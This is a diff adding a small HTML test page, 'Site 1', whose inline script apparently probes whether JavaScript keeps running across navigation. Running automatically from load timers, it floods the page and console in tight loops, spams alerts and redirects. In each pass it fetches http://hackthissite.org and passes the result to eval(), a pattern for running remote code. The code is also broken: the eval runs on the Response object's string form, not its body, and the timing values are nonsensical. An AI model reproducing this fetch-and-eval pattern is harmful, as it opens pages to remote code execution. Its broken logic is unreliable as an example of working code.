@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Site 1</title>
+</head>
+<body>
+    <h1>I am site 1</h1>
+    <p id="t" style="color:white;"></p>
+    <script type="text/javascript">
+        var _stop = false;
+        var _i = 0;
+        var l = window.location.pathname;
+        function generateRandomChars(){
+            return Math.random()*100;
+        }
+        setTimeout(function(){
+            _i = 1;
+            _stop = true;
+            alert("Leaving");
+        },4000)
+        setTimeout(function(){
+            _stop = true;
+        },4000)
+        function showDocument(){
+            return window.location.pathname+" "+document.title;
+        }
+        setTimeout(function(){
+            var iid = setInterval(function(){
+                for(var i = 0; i < 1000;i++){
+                    if(_stop || _i == 1){clearInterval(iid);open("./site2.html","_self");};
+                    //From here the magic happens
+                    var fake_char = String.fromCharCode(generateRandomChars());
+                    document.getElementById("t").innerHTML += fake_char
+                    console.log((window.crossover = "CROSSED_OVER"+fake_char)+showDocument());
+                    fetch("http://hackthissite.org",{
+                        method: "GET",
+                        mode: "cors"
+                    }).then(r => eval(r.toString()))/*.catch(e => console.log(showDocument())))*/.catch(function(e){
+                        window._P = document.createElement("p");
+                        window._P.innerText = "Hey";
+                        window.document.body.appendChild(window._P)
+                        console.log("Error occured");
+                        onload = function(e){
+                            alert("Loaded from /");
+                        }
+                        if(_stop == true){
+                            setTimeout(function(){
+                                alert(window.location.pathname);
+                            },1000)
+                        }
+                    });
+                    if(l != window.location.pathname){
+                        alert("Inside new context!!!!!!!!!!!");
+                    }
+                }
+            },0.00000000000000000000000000000000000000000000000000000000000000001)
+        },100);
+        onerror = function(e){
+            console.log(e+" "+showDocument())
+        }
+    </script>
+</body>
+</html>
